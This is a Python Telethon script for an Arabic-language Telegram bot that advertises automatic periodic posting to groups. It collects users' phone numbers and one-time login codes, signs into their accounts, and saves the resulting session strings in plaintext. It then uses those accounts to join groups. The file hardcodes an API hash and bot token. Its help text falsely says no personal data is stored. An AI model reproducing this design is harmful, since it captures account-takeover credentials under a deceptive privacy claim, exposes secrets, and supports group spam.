import asyncio
import sqlite3
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.tl.functions.messages import ImportChatInviteRequest
import re

# إعدادات البوت
API_ID = 23656977
API_HASH = '49d3f43531a92b3f5bc403766313ca1e'
BOT_TOKEN = '7966976239:AAEy5WkQDszmVbuInTnuOyUXskhyO7ak9Nc'

# تهيئة قاعدة البيانات
conn = sqlite3.connect('bot_data.db')
c = conn.cursor()

# إنشاء الجداول
c.execute('''CREATE TABLE IF NOT EXISTS users
             (user_id INTEGER PRIMARY KEY, phone TEXT, session TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS groups
             (group_id INTEGER PRIMARY KEY, user_id INTEGER, title TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS stats
             (user_id INTEGER PRIMARY KEY, publish_count INTEGER)''')
conn.commit()

# تهيئة العميل
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# لوحة المفاتيح الرئيسية
def main_keyboard():
    return [
        [Button.inline("════ LOGIN | تسجيل ════", b'login')],
        [
            Button.inline("بدء النشر", b'start_publishing'),
            Button.inline("اضف سوبر", b'add_super')
        ],
        [
            Button.inline("مساعدة", b'help'),
            Button.inline("احصائيات", b'stats')
        ]
    ]

# لوحة فترات النشر
def intervals_keyboard():
    return [
        [Button.inline("2 دقائق", b'interval_2')],
        [Button.inline("5 دقائق", b'interval_5')],
        [Button.inline("10 دقائق", b'interval_10')],
        [Button.inline("20 دقيقة", b'interval_20')],
        [Button.inline("30 دقيقة", b'interval_30')],
        [Button.inline("60 دقيقة", b'interval_60')],
        [Button.inline("120 دقيقة", b'interval_120')],
        [Button.inline("رجوع", b'back_main')]
    ]

# لوحة الرجوع
def back_keyboard():
    return [[Button.inline("رجوع", b'back_main')]]

# بدء البوت
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.reply(
        "مرحباً! أنا بوت النشر التلقائي في المجموعات",
        buttons=main_keyboard()
    )

# معالجة الضغط على الأزرار
@bot.on(events.CallbackQuery)
async def callback_handler(event):
    data = event.data.decode('utf-8')
    user_id = event.sender_id
    
    if data == 'login':
        await login(event)
    elif data == 'add_super':
        await add_super(event)
    elif data == 'start_publishing':
        await show_intervals(event)
    elif data == 'help':
        await show_help(event)
    elif data == 'stats':
        await show_stats(event)
    elif data == 'back_main':
        await back_to_main(event)
    elif data.startswith('interval_'):
        await start_publishing(event, data)
    else:
        await event.answer("خيار غير معروف!")

# عملية تسجيل الدخول
async def login(event):
    await event.edit(
        "أرسل رقم هاتفك مع رمز الدولة (مثال: +20123456789)",
        buttons=back_keyboard()
    )
    
    try:
        phone_msg = await bot.wait_event(
            events.NewMessage(from_id=event.sender_id),
            timeout=60
        )
        phone = phone_msg.text
        
        if not re.match(r'^\+\d{10,15}$', phone):
            await event.reply("رقم غير صحيح! أعد المحاولة")
            return
        
        # حفظ رقم الهاتف مؤقتاً
        c.execute("INSERT OR REPLACE INTO users (user_id, phone) VALUES (?, ?)", 
                 (event.sender_id, phone))
        conn.commit()
        
        # إنشاء جلسة جديدة
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        # إرسال الرمز
        await client.send_code_request(phone)
        await event.reply("تم إرسال رمز التحقق. أرسل الرمز الآن (5 أرقام)")
        
        # استقبال الرمز
        code_msg = await bot.wait_event(
            events.NewMessage(from_id=event.sender_id),
            timeout=120
        )
        code = code_msg.text
        
        # تسجيل الدخول
        await client.sign_in(phone, code)
        session_str = client.session.save()
        
        # حفظ الجلسة
        c.execute("UPDATE users SET session = ? WHERE user_id = ?", 
                 (session_str, event.sender_id))
        conn.commit()
        
        await event.reply("✅ تم تسجيل الدخول بنجاح!", buttons=main_keyboard())
        
    except asyncio.TimeoutError:
        await event.reply("انتهى الوقت! أعد المحاولة", buttons=main_keyboard())

# إضافة مجموعات سوبر
async def add_super(event):
    await event.edit(
        "أرسل رابط الدعوة للمجموعة (يجب أن تكون رابط دعوة صالح)",
        buttons=back_keyboard()
    )
    
    try:
        group_msg = await bot.wait_event(
            events.NewMessage(from_id=event.sender_id),
            timeout=60
        )
        invite_link = group_msg.text
        
        # استخراج الهاش من الرابط
        hash_match = re.search(r'\+(\w+)', invite_link)
        if not hash_match:
            await event.reply("رابط غير صالح!")
            return
        
        invite_hash = hash_match.group(1)
        
        # الانضمام للمجموعة
        client = await get_user_client(event.sender_id)
        result = await client(ImportChatInviteRequest(invite_hash))
        
        # حفظ المجموعة
        c.execute("INSERT OR IGNORE INTO groups (group_id, user_id, title) VALUES (?, ?, ?)",
                 (result.chats[0].id, event.sender_id, result.chats[0].title))
        conn.commit()
        
        await event.reply(f"✅ تم إضافة المجموعة: {result.chats[0].title}", buttons=main_keyboard())
        
    except Exception as e:
        await event.reply(f"خطأ: {str(e)}", buttons=main_keyboard())

# بدء النشر الدوري
async def start_publishing(event, interval_data):
    minutes = int(interval_data.split('_')[1])
    user_id = event.sender_id
    
    await event.edit(
        f"⏱ سيبدأ النشر كل {minutes} دقيقة",
        buttons=back_keyboard()
    )
    
    # هنا يمكنك إضافة وظيفة النشر الفعلية
    # مثال: 
    # while True:
    #     await publish_to_groups(user_id)
    #     await asyncio.sleep(minutes * 60)

# عرض الإحصائيات
async def show_stats(event):
    user_id = event.sender_id
    
    # مجموع المستخدمين
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    
    # مجموع المجموعات
    c.execute("SELECT COUNT(*) FROM groups")
    total_groups = c.fetchone()[0]
    
    # إحصائيات المستخدم
    c.execute("SELECT publish_count FROM stats WHERE user_id = ?", (user_id,))
    user_stats = c.fetchone()
    user_count = user_stats[0] if user_stats else 0
    
    message = (
        f"📊 إحصائيات البوت:\n\n"
        f"• عدد المستخدمين: {total_users}\n"
        f"• عدد المجموعات: {total_groups}\n"
        f"• عدد نشراتك: {user_count}\n\n"
        f"المطور: @Ili8_8ill"
    )
    
    await event.edit(message, buttons=back_keyboard())

# عرض المساعدة
async def show_help(event):
    help_text = (
        "⚙️ طريقة الاستخدام:\n\n"
        "1. اضغط على 'تسجيل' لإضافة حسابك\n"
        "2. استخدم 'اضف سوبر' لإضافة مجموعاتك\n"
        "3. اختر 'بدء النشر' لتحديد الفترة\n\n"
        "⚠️ تحذيرات:\n"
        "- لا تشارك رمز التحقق مع أحد\n"
        "- تأكد من صلاحية روابط الدعوة\n"
        "- البوت لا يخزن بياناتك الشخصية\n\n"
        "المطور: @Ili8_8ill"
    )
    await event.edit(help_text, buttons=back_keyboard())

# وظائف مساعدة
async def get_user_client(user_id):
    c.execute("SELECT session FROM users WHERE user_id = ?", (user_id,))
    session_str = c.fetchone()
    if not session_str:
        return None
    
    client = TelegramClient(StringSession(session_str[0]), API_ID, API_HASH)
    await client.connect()
    return client

async def show_intervals(event):
    await event.edit(
        "اختر الفترة بين النشرات:",
        buttons=intervals_keyboard()
    )

async def back_to_main(event):
    await event.edit(
        "القائمة الرئيسية:",
        buttons=main_keyboard()
    )

if __name__ == '__main__':
    print("Bot is running...")
    bot.run_until_disconnected()
